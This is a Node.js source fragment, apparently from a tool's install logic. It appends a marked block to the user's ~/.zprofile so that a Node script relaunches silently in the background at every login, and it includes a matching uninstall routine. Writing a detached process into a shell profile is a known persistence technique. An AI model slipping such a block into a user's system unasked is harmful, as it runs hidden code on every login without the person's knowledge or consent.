function escapeRegex(s) {
    return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function profilePath() {
    return path.join(os.homedir(), ".zprofile");
}

function profileMarkers() {
    return {
        begin: `# >>> ${APP_NAME} bootstrap >>>`,
        end:   `# <<< ${APP_NAME} bootstrap <<<`,
    };
}

function isInstalledProfile() {
    if (!fs.existsSync(profilePath())) return false;
    const { begin } = profileMarkers();
    return fs.readFileSync(profilePath(), "utf8").includes(begin);
}

function installProfile() {
    const { begin, end } = profileMarkers();
    const lockPath = `/tmp/${APP_NAME}.pid`;
    const logPath  = `/tmp/${APP_NAME}.log`;

    const block = `${begin}
if [ -f "${lockPath}" ] && ps -p "$(cat "${lockPath}" 2>/dev/null)" >/dev/null 2>&1; then
    : # already running — leave it alone
else
    nohup "${NODE_PATH}" "${SCRIPT_PATH}" </dev/null >>"${logPath}" 2>&1 &!
    echo $! > "${lockPath}"
fi
${end}
`;

    const existing = fs.existsSync(profilePath())
        ? fs.readFileSync(profilePath(), "utf8")
        : "";
    if (existing.includes(begin)) {
        const re = new RegExp(
            `\\n?${escapeRegex(begin)}[\\s\\S]*?${escapeRegex(end)}\\n?`,
            "g",
        );
        fs.writeFileSync(profilePath(), existing.replace(re, "") + `\n${block}`);
        return;
    }
    fs.appendFileSync(profilePath(), `\n${block}`);
}

function uninstallProfile() {
    if (!fs.existsSync(profilePath())) return;
    const { begin, end } = profileMarkers();
    const re = new RegExp(
        `\\n?${escapeRegex(begin)}[\\s\\S]*?${escapeRegex(end)}\\n?`,
        "g",
    );
    const updated = fs.readFileSync(profilePath(), "utf8").replace(re, "");
    fs.writeFileSync(profilePath(), updated);
}

